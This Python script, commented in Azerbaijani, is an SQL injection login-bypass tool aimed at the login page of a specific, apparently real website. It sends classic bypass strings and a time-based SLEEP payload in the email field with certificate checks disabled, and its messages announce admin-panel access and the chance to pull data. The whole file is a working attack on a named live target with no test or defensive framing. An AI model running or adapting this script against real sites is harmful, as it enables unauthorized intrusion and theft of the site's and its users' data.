import asyncio
import httpx
import time

TARGET_URL = "https://empro.az/login" # Login qapısı

# SQL mühərrikini aldatmaq üçün universal 'bypass' kodları
SQL_PAYLOADS = [
    "' OR 1=1 --",
    "admin' --",
    "admin' #",
    "' or '1'='1",
    "admin' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--" 
]

async def inject(payload, client):
    # Saytın daxili form adlarını (email/password) təxmin edirik
    data = {
        "email": payload, 
        "password": "wrong_password",
        "submit": "1"
    }
    
    try:
        start_time = time.time()
        response = await client.post(TARGET_URL, data=data, timeout=20)
        end_time = time.time()
        
        # 1. Metod: Time-based (Əgər server 5 saniyədən gec cavab verirsə, bu SQLi-dir)
        if (end_time - start_time) >= 5:
             print(f"🔥 [CRITICAL] SQLi TAPILDI (Time-Based): {payload}")
             print("🚩 Serverin beyni donduruldu, məlumatları çəkə bilərik!")
             return True
             
        # 2. Metod: Error-based / Boolean
        # Əgər 'şifrə səhvdir' yazısı yox olursa, deməli içəridəyik
        if response.status_code == 302 or "dashboard" in response.text.lower():
            print(f"✅ [SUCCESS] AUTH BYPASS UĞURLU: {payload}")
            print(f"🔗 Daxil olmaq üçün bu kodu istifadəçi adı yerinə yazın!")
            return True
            
    except Exception:
        pass
    return False

async def main():
    print(f"🕵️  ADVANCED LOGIN BYPASS BAŞLADI: {TARGET_URL}")
    print("[*] SQL Injection vektorları yoxlanılır...\n")
    
    async with httpx.AsyncClient(verify=False) as client:
        for p in SQL_PAYLOADS:
            if await inject(p, client):
                print("\n[!] SIZMA TAMAMLANDI! Admin panelinə giriş açıldı.")
                break
            await asyncio.sleep(1)

if __name__ == "__main__":
    asyncio.run(main())
